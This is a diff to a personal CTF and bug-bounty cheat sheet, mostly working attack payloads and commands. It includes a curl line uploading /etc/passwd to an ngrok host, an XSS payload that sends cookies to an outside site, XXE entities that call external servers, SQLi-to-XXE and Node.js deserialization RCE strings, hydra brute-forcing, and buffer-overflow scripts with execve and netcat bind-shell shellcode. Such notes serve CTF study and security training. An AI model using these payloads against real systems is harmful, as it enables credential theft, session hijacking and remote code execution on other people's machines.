@@ -1,6 +1,15 @@
 IMPORTANT FACT
 =========================================================================
+***for CTF u must understand the hint
+***curl -F shl=@/etc/passwd blablabla.ngrok.io
+***entity_id=1+or+if(mid(@@version,1,1)=5,1,2)=2%23
+
+**during lfi testing try ..%2f..%2fetc
+
+**searchsploit for finding exploit
+
 *webscreenshot to capture shot of webpages
+*file://c:\WEB\HTML
 *magick hacshes->https://www.whitehatsec.com/blog/magic-hashes/
 *apache sometime directory listing
 *hashcat,hash-identifier
@@ -8,6 +17,82 @@ IMPORTANT FACT
 ** check every possible way, dont be lazzy
 **if any send message or comment try "><script>window.location="//x.com"+document.cookie> to get cookie
 **if there is like id=123 then consider id=1/0 as admin account and continue attack
+**scp bob@servername.com:/home/bob/public_html/index.php Downloads/
+**cewl -d 0 -w output.txt http://x.com //used togenerate wordlist from webpages
+**If found any template engine like flask jinja etc then put {{5*5}},{{config}}
+**hydra -l user-P pass.txt ftp://192.168.2.155
+
+FILE UPLOAD
+============
+1.if image upload try imagemagick
+2.pixel flood
+3.pillete extractor.
+4.svg upload and xxe/xss/setting cookie
+5.shell uploading by null byte/content type change/gif uploading...
+6.directory traversal
+
+XXE via spreadsheet(doc,docx,xlsx)
+=================================
+**https://buer.haus/xxegen/
+**goto https://github.com/BuffaloWill/oxml_xxe and generate many xxe payload file
+**
+read file Read file xxe.xlsx\xl\worksheets\sheet1.xml and add payload
+<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "lol" "file:///etc/passwd" >]>
+also u can add <asd>&xxe;<asd>inside root element or outside root element.
+
+**unzip docx and edit  [Content_Types].xml with bellow payload
+<!DOCTYPE go [
+<!ENTITY % go2 SYSTEM "http://192.168.1.1:8000/XXE">
+%go2;]>
+zip -u xxe.docx \[Content_Types\].xml
+**
+you can add payload in following file...
+DOCX=>/word/document.xml
+PPTX=>/ppt/presentation.xml
+XLSX=>/xl/workbook.xml
+XSS
+--------------
+< !ENTITY post "<script>alert(1)...
+< !ENTITY post "< ![CDATA[<script>alert(1)...
+LFI
+--------------
+Relationship Id="rId1" Type="...relationships/officeDocument" Target="/word/document.xml"
+
+
+DIRECTORY SCANNER
+================
+1.dirb 2.uniscan 3.nikto 4.gobuster 
+all directory wordlist and rockyou.txt locate at /home/user/Desktop/bug_bounty/CTF/wordlist
+
+sqli to xxe
+================
+Xxxx'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % evil SYSTEM "http://haxor.com/ ">%evil;]>'),'/l') from dual)||'
+
+
+find file
+===============
+find . -name testfile.txt =>current directory /subdirectory
+find /home -type f -name '*.jpg
+find / -size 50c
+find / -mtime 1 //find file which midfied 1day ago
+find / -user syslog
+find / -perm 644
+find / -group shadow
+
+SERIALIZE
+=======================
+nodejs
+----------
+{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });}()"}
+
+php
+-----------
+O:9:"FileClass":1:{s:8:"filename";s:10:"config.php";}
+
+PHP MAGIC FUNCTION
+=====================
+__construct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(), __sleep(), __wakeup(), __toString(), __invoke(), __set_state() and __clone()
+
 
 COMMAND WITHOUT SPACE
 ======================
@@ -177,6 +262,16 @@ $_GET['p']=1 and $_GET['asd']=*hex(substr((select password),1,1)); //substr or s
     $stmt->execute();
 it automatically escape $validateId parameter and placed in place holder
 
+11.
+  if($_GET["str1"] and $_GET["str2"]) {
+    if ($_GET["str1"] !== $_GET["str2"] and
+        hash("md5", $salt . $_GET["str1"]) === hash("md5", $salt . $_GET["str2"])) {
+      echo $flag;
+    }
+
+ str1[[]=xss&str2[]=asada
+
+
 code
 =========================================================================================
   if(strcmp($PASSWORD, $_GET['password']) == 0){
@@ -206,6 +301,11 @@ Perl Vulneraility
 https://ehsandev.com/pico2014/web_exploitation/make_a_face.html
 http://www.cgisecurity.com/lib/sips.html
 
+ZIP/RAR cracker
+===================
+1.rar2john ./a.rar > hash.txt
+  john ./hash.txt
+2.fcrackzip
 
 PDF && PASSWORD
 =========
@@ -278,8 +378,33 @@ goto https://md5db.net/explore/ for specific pattern
   os.system('/bin/sh') input gives shell
 **if python script is obfuscated then may try decode to decimal or something
 
-RSA
-===============
+  RSA
+========================================================================================
+
+openssl rsa -in  task/bob3.pub -pubin -text -modulus
+openssl rsa -pubin -inform PEM -text -noout < bob.pub
+
+decrypt using private key + base64 encode of raw ciphertext
+----------------------------------------------------------
+ base64 -d flag.b64 | openssl rsautl -decrypt -inkey private.key | cat
+
+decrypt using private key+base64 of raw encrypt file
+----------------------------------------------
+
+def decrypt_RSA(privkey, message):
+    from Crypto.PublicKey import RSA  
+    from base64 import b64decode 
+    key = open(privkey, "r").read() 
+    rsakey = RSA.importKey(key) 
+    decrypted = rsakey.decrypt(b64decode(message)) 
+    return decrypted
+flag = "Ni45iH4UnXSttNuf0Oy80+G5J7tm8sBJuDNN7qfTIdEKJow4siF2cpSbP/qIWDjSi+w=" //base64 encode of raw encrypted file like open('enc.txt','r').read().strip().encode('hex')
+print decrypt_RSA('private.key', flag)
+
+decrypt messeage from public key + raw ciphertext file
+-----------------------------------------------------
+RsaCtfTool.py --publickey ./key.pub --uncipher ./flag --verbose --private //not recommended // ./flag is in base64 of raw data
+
 generate publickey from n and e
 -------------------------------
 ./RsaCtfTool.py --createpub --n 4152 --e 53327
@@ -289,6 +414,21 @@ for multiple key
 for singlekey
 ---------------------
 ./RsaCtfTool.py --publickey "a.key" --verbose --private
+
+Decrypt using number ciphertext
+-------------------------
+phi = (p- 1) * (q-1)
+d = libnum.modular.invmod(e, phi)
+print libnum.n2s(pow(c, d, N)) //c must be in number format
+
+Here p,q,N is number and c is ciphertext where
+c1=open('a.txt','r').read().strip().encode('hex') // a.txt file contain raw encrypt data
+c=0xc1 (here c1 is above cipher hex encode)
+
+also youcan get raw cipher text from number
+c is in number format.
+c1=hex(c)
+c=c1.decode('hex')
 
 *common factor
 *weiner attack when N is smaller than e ,also when N is in both public key
@@ -315,10 +455,32 @@ goto RsaCtfTool for different attack
 usefull features in RsaCtfTool
 openssl rsautl -decrypt -in $ENCRYPTED -out $PLAINTEXT -inkey keys/privkey.pem
 openssl rsautl -encrypt -in $PLAINTEXT -out $PLAINTEXT.encrypt -pubin -inkey keys/pubkey.pem
+ 
 
-phi = (p- 1) * (q-1)
-d = libnum.modular.invmod(e, phi)
-print libnum.n2s(pow(c, d, N))
+Chinese Remainder Theorem
+----------------------------
+if a N has multiple prime then this method.
+if u given c,n and using yafu you found multiple prime then this method.
+https://github.com/diogoaj/ctf-writeups/tree/master/2018/Timisoara/crypto/NotYourAverageRSA
+
+# From https://crypto.stackexchange.com/questions/31109/rsa-enc-decryption-with-multiple-prime-modulus-using-crt
+ts = []
+xs = []
+ds = []
+for i in range(len(primes)):
+	ds.append(modinv(e, primes[i]-1))
+m = primes[0]
+for i in range(1, len(primes)):
+	ts.append(modinv(m, primes[i]))
+	m = m * primes[i]
+for i in range(len(primes)):
+	xs.append(pow((c%primes[i]), ds[i], primes[i]))
+x = xs[0]
+m = primes[0]
+for i in range(1, len(primes)):
+	x = x + m * ((xs[i] - x % primes[i]) * (ts[i-1] % primes[i]))
+	m = m * primes[i]
+print hex(x%n)[2:-1].decode("hex")
 
 
 
@@ -366,8 +528,6 @@ a,b,c = find_zero_md5md5()
 print a,b,c
 
 
-openssl rsa -in  task/bob3.pub -pubin -text -modulus
-openssl rsa -pubin -inform PEM -text -noout < bob.pub
 
 openssl enc   -aes-128-ecb -a -in input2 -out output -k "YELLOW SUBMARINE"
 openssl enc -d  -aes-128-ecb -a -in input2 -out output -k "YELLOW SUBMARINE"
@@ -454,7 +614,7 @@ ffmpeg -i song.webm -map 0:2 out.wav => extract hidden audio file
 multimon-ng -t wav -a DTMF out.wav =>decode dual tone
 
 CRYPTO
-==============
+=========================================================
 1.Xor 2.shift 3.RotN 4.Vegenere 5.substitution
 
 STTEGO
@@ -462,6 +622,7 @@ STTEGO
 =====================================================================================================
 1.binwalk 2.exiftool 3.ghex 4.strings 5.openstego 6.stegsolve 7.steghide(support JPEG,BMP,wav,AU)
 
+binwalk --dd='.*' music.mp3
 steghide extract -sf steghide.jpg -p password (always use this for addition info or if password protected)
 
 if noclue about image the try reverse google image search
@@ -488,11 +649,16 @@ im.save("alive_parrot.png") # Save the modified pixels as png
 REVERSE ENG
 =============================================================================================================
 =============================================================================================================
-1.gdb 2.ida 3.r2
+1.gdb 2.ida 3.r2 4.hopper
 
 BUFFER OVERFLOW
 ================
-*python -c "print 'A'*32 + 'BBBB'" | strace -i ./pwn4 |& grep si_addr
+***find return address
+python -c "print 'A'*32 + 'BBBB'" | strace -i ./pwn4 |& grep si_addr
+
+***x/40wx $esp =>print stack and find whre buffer start
+*** info frame =>get ebp and eip ADDRESS
+***info register =>get all register
 ***
 1.first try to find out max length by segment fault like { python -c "print 'A'*30" |./a.out }
 2. now have to overwrite RT to some other function address.
@@ -500,15 +666,77 @@ BUFFER OVERFLOW
     Use gdb to find the address of that function
     now type { python -c "print 'A'*30+'\x12\x44'" |./a.out }
 
+3. objdump -t ./a.out|grep varriable
+4. print win //in gdb used tofind address of func/varriable
+
 ** 
 ltrace= find dynamic librabry 
 strace=  findsystem library
+*****
+*****another way to find length for buffer overflow
+ a) first make break point after gets
+ b) give input in buffer AAAAAAA
+ c) print x/40wx $esp and get the buffer address //also you can find buffer start using assembly line [ lea -0x5c(%esp) %eax]
+ d) print info frame // get return address(eip) //the last eip in showing result
+ e) calculate length to overflow like [start buffer address]-[eip]
+
+also can find overflow length with [python -c "print 'A'*76+'BBBB'"|strace -i ./stack5]
+
+find eip overwritten or not / find buffer overflow length
+-------------------------------------------------------
+put break point after gets. give input AAAAAA... and hit breakpoint.
+find start of buffer using x/120s $esp
+type info frame and get first saved eip and check does it overwritten.
+ 
+****
+suppose buffer is 64 bytes and it requires 76 bytes to overwrite ebp and another 4 bytes to overwrite eip.
+now we can put shellcode within 76 bytes and jump eip to start of the buffer and also put \x90 in starting of buffer. thus we can executes shellcode.
+But also try to put shellcode after eip because if shellcode is large and buffer is small
+
+putting shellcode after RT
+---------------------------------
+ a) python -c "print 'A'*76+'BBBB'+'C'*120"|./stack5
+        now print x/10s $esp in gdb , if C found in stack then u can put shellcode after eip.
+ b) python -c "print 'A'*76+'addresss where \x90 or C start to jump'+'\x90'*120+'shellcode....'"|./stack5 
+
+  try netcat shellcode "\xbd\x9b\x77\x1c\xf3\xdd\xc0\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x14\x31\x6b\x14\x83\xeb\xfc\x03\x6b\x10\x79\x82\x2d\x28\x8a\x8e\x1d\x8d\x27\x3b\xa0\x98\x26\x0b\xc2\x57\x28\x37\x55\x3a\x40\xca\x69\xab\xcc\xa0\x79\x9a\xbc\xbd\x9b\x76\x5a\xe6\x96\x07\x2b\x57\x2d\xbb\x2f\xe8\x4b\x76\xaf\x4b\x24\xee\x62\xcb\xd7\xb6\x16\xf3\x8f\x85\x66\x42\x49\xee\x0e\x7a\x86\x7d\xa6\xec\xf7\xe3\x5f\x83\x8e\x07\xcf\x08\x18\x26\x5f\xa5\xd7\x29"
+  it will create nc -lnvp 4444 -e /bin/sh command 
+
+***
+push   %ebp
+mov    %esp,%ebp
+and    $0xfffffff0,%esp
+sub    $0x60,%esp
+movl   $0x0,0x5c(%esp)
+lea    0x1c(%esp),%eax
+mov    %eax,(%esp)
+call   0x804830c <gets@plt>
+
+buffer address esp+0x1c stored in eax and then pushed into esp ,so we can stored value there.
+if we break point after gets and print x $esp we get address of buffer esp+0x1c
+
+
 
 shellcode
 -----------
 http://www.theprohack.com/2010/09/buffer-overflow-attack-tutorial-by.html
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 => 25 bytes https://dhavalkapil.com/blogs/Shellcode-Injection/
 \x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80 => 32 bytes https://samsclass.info/127/proj/p3-lbuf1.htm
+
+metasploit shellcode
+-------------
+msfvenom -p linux/x86/exec -f pl -b '\x0d\x0a\x00\xff' CMD=/bin/sh PrependSetresuid=true
+
+
+
+#!/usr/bin/env python
+offset = 72
+shellcode = "\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80"
+nopsled = "\x90" * (offset - len(shellcode))
+ret = "\x90\xf7\xff\xbf"
+payload = nopsled + shellcode + "JJJJ" + ret
+print payload
+
 
 #include <stdlib.h>
 #include <unistd.h>
@@ -592,9 +820,22 @@ and $ebp at 0xffffcf28 ,so we can find offset between them + 4 RT
 FORMAT STRNGS
 -----------------
 %n is used to write in memory
-1.first find out where our data is located in stack using  => ./vuln `python -c "print 'AAAA '+'%x '*100"`
-2.it print AAAA 0xbffff.. 0xbff...  AAAA =>here do it still you your first string AAAA in last like here
-3.Here you have to replace AAAA with address to write in memory. 
+1.first find out where our data is located in stack using  => ./vuln "`python -c "print 'AAAA '+'BBBB'+'%x '*100"`"
+2.it print AAAA 0xbffff.. 0xbff...  AAAA BBBB =>here do it still you your first string BBBB in last like here
+3.Here you have to replace BBBB with address to write in memory. 
+   
+suppose address of varriable whose value to be overwrite is 0x639874
+ a) ./vuln "`python -c "print 'AAAA '+'BBBB'+'%x '*100"`"
+    it prints AAAA....0x...BBBB
+ b) ./vuln "`python -c "print 'AAAA '+'\x74\x98\x63'+'%x '*99+'%n'"`"
+   it will overwrite the value to given address
+https://www.youtube.com/watch?v=0WvrSfcdq1I
+
+ a)./vuln "`python -c "print 'AAAA'+'%x '*100"`"%x
+    it prints AAAA....0x...AAAA
+ b) ./vuln "`python -c "print 'address'+'%x '*100"`"%n
+
+
 
 ROP
 ------------
